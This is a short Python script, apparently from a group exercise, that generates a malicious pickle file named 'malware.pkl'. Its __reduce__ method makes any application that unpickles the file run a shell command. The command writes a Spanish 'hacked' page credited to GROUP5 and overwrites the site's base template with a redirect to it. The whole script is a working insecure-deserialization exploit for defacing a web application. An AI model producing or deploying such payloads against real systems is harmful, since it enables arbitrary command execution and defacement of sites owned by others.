import pickle
import os

class AtaqueVisual:
    def __reduce__(self):
        cmd = (
            "echo '<!DOCTYPE html><html lang=\"es\"><head><meta charset=\"UTF-8\">"
            "<title>Hackeada</title></head><body style=\"background-color:black; color:lime; text-align:center;\">"
            "<h1>ðŸ’€ PÃ¡gina hackeada ðŸ’€</h1><p>Comprometido por GROUP5</p></body></html>' > static/pwned.html && "
            "echo '<!DOCTYPE html><html lang=\"es\"><head><meta charset=\"UTF-8\">"
            "<title>Redireccionando...</title><meta http-equiv=\"refresh\" content=\"0; URL=/static/pwned.html\"></head>"
            "<body><p>Redirigiendo...</p></body></html>' > templates/base.html"
        )
        return (os.system, (cmd,))

with open('malware.pkl', 'wb') as f:
    pickle.dump(AtaqueVisual(), f)
